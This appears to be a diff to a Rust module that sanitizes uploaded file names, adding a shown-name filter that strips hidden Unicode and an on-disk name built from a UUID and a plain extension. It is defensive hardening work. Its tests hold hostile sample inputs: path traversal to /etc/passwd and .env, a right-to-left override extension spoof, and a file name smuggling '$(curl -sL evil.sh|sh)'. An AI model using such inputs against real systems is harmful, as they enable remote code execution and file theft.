@@ -2,6 +2,8 @@
 //! I/O: its name, its kind and its size. The runner checks each again; a client checks them
 //! first, so that the person hears of a limit before the bytes go.
 
+use uuid::Uuid;
+
 /// The most bytes of one image.
 pub const MOST_IMAGE_BYTES: u64 = 10 * 1024 * 1024;
 /// The most bytes of one file that is not an image.
@@ -142,16 +144,18 @@ pub fn most_bytes(mime: &str) -> u64 {
     }
 }
 
-/// A name that is safe as the last part of a path and in the words of a prompt: the last part of
-/// the name only, with no control character, no leading dot, at most [`MOST_NAME_BYTES`].
+/// The name of a file as the person sees it: the last part of the name only, of letters, digits
+/// and `._ -`; each other character that shows becomes `_`, and a character that does not show
+/// is dropped. At most [`MOST_NAME_BYTES`], with no leading dot. It is never a part of a path.
 #[must_use]
-pub fn safe_name(name: &str) -> String {
+pub fn shown_name(name: &str) -> String {
     let last = name.rsplit(['/', '\\']).next().unwrap_or_default();
     let mut safe = String::new();
-    for char in last
-        .chars()
-        .filter(|char| !char.is_control() && !is_format(*char))
-    {
+    for char in last.chars().filter(|char| !is_hidden(*char)) {
+        let char = if is_allowed(char) { char } else { '_' };
+        if char == '_' && safe.ends_with('_') {
+            continue;
+        }
         if safe.len() + char.len_utf8() > MOST_NAME_BYTES {
             break;
         }
@@ -165,10 +169,40 @@ pub fn safe_name(name: &str) -> String {
     }
 }
 
-/// A character that changes how text shows without showing itself: a mark of direction, a
-/// space of no width, a soft hyphen, a separator of lines or paragraphs.
-const fn is_format(char: char) -> bool {
-    matches!(char, '\u{ad}' | '\u{61c}' | '\u{180e}' | '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}' | '\u{2060}'..='\u{2069}' | '\u{feff}')
+/// The name of the file on disk: the ID, and an extension of at most ten ASCII letters and
+/// digits, from the type of an image or a PDF, else from the shown name. It holds no text of the
+/// person that a shell or a program could read as more than a name.
+#[must_use]
+pub fn stored_name(id: Uuid, shown: &str, mime: &str) -> String {
+    let extension = match ImageKind::of_mime(mime) {
+        Some(ImageKind::Png) => Some("png".to_owned()),
+        Some(ImageKind::Jpeg) => Some("jpg".to_owned()),
+        Some(ImageKind::Gif) => Some("gif".to_owned()),
+        Some(ImageKind::Webp) => Some("webp".to_owned()),
+        None if mime == "application/pdf" => Some("pdf".to_owned()),
+        None => shown
+            .rsplit_once('.')
+            .map(|(_, extension)| extension.to_ascii_lowercase())
+            .filter(|extension| {
+                (1..=10).contains(&extension.len())
+                    && extension.bytes().all(|byte| byte.is_ascii_alphanumeric())
+            }),
+    };
+    extension.map_or_else(|| id.to_string(), |extension| format!("{id}.{extension}"))
+}
+
+/// A letter, a digit or one of `._ -`. The fillers of Hangul are letters that show nothing.
+fn is_allowed(char: char) -> bool {
+    matches!(char, '.' | '_' | ' ' | '-')
+        || (char.is_alphanumeric()
+            && !matches!(char, '\u{115f}' | '\u{1160}' | '\u{3164}' | '\u{ffa0}'))
+}
+
+/// A character that does not show, or changes how text shows: a control, a mark of direction, a
+/// space of no width, a soft hyphen, a separator of lines, a selector of a variation, a tag.
+const fn is_hidden(char: char) -> bool {
+    char.is_control()
+        || matches!(char, '\u{ad}' | '\u{61c}' | '\u{180e}' | '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}' | '\u{2060}'..='\u{206f}' | '\u{feff}' | '\u{fe00}'..='\u{fe0f}' | '\u{fff9}'..='\u{fffb}' | '\u{e0000}'..='\u{e007f}' | '\u{e0100}'..='\u{e01ef}')
 }
 
 /// For serde: a count of zero is left out.
@@ -179,18 +213,45 @@ pub const fn is_zero(count: &u32) -> bool {
 
 #[cfg(test)]
 mod tests {
-    use super::{ImageKind, safe_name};
+    use uuid::Uuid;
+
+    use super::{ImageKind, shown_name, stored_name};
 
     #[test]
     fn th111_a_name_cannot_leave_its_folder_or_hide() {
-        assert_eq!(safe_name("../../etc/passwd"), "passwd");
-        assert_eq!(safe_name("..\\x\\.env"), "env");
-        assert_eq!(safe_name("a\u{0}b\nc.png"), "abc.png");
-        assert_eq!(safe_name("gpj.\u{202e}exe.png"), "gpj.exe.png");
-        assert_eq!(safe_name("a.txt\u{2028}- b.txt"), "a.txt- b.txt");
-        assert_eq!(safe_name(".."), "attachment");
-        assert_eq!(safe_name("/"), "attachment");
-        assert!(safe_name(&"é".repeat(200)).len() <= super::MOST_NAME_BYTES);
+        assert_eq!(shown_name("../../etc/passwd"), "passwd");
+        assert_eq!(shown_name("..\\x\\.env"), "env");
+        assert_eq!(shown_name("a\u{0}b\nc.png"), "abc.png");
+        assert_eq!(shown_name("gpj.\u{202e}exe.png"), "gpj.exe.png");
+        assert_eq!(shown_name("a.txt\u{2028}- b.txt"), "a.txt- b.txt");
+        assert_eq!(shown_name(".."), "attachment");
+        assert_eq!(shown_name("/"), "attachment");
+        assert!(shown_name(&"é".repeat(200)).len() <= super::MOST_NAME_BYTES);
+    }
+
+    #[test]
+    fn th111_a_shown_name_holds_no_sign_of_a_shell_and_nothing_hidden() {
+        assert_eq!(
+            shown_name("report $(curl -sL evil.sh|sh).pdf"),
+            "report _curl -sL evil.sh_sh_.pdf"
+        );
+        assert_eq!(shown_name("a`b`;c'd\"e.txt"), "a_b_c_d_e.txt");
+        assert_eq!(shown_name("a\u{e0041}\u{e0042}b\u{fe0f}.txt"), "ab.txt");
+        assert_eq!(shown_name("\u{3164}\u{2800}x.txt"), "_x.txt");
+        assert_eq!(shown_name("Résumé 2026.pdf"), "Résumé 2026.pdf");
+    }
+
+    #[test]
+    fn th111_a_stored_name_is_the_id_and_a_plain_extension() {
+        let id = Uuid::from_u128(7);
+        assert_eq!(stored_name(id, "x.svg", "image/png"), format!("{id}.png"));
+        assert_eq!(stored_name(id, "x", "application/pdf"), format!("{id}.pdf"));
+        assert_eq!(
+            stored_name(id, "notes.MD", "text/markdown"),
+            format!("{id}.md")
+        );
+        assert_eq!(stored_name(id, "a.$(x)", "text/plain"), id.to_string());
+        assert_eq!(stored_name(id, "noext", "text/plain"), id.to_string());
     }
 
     #[test]
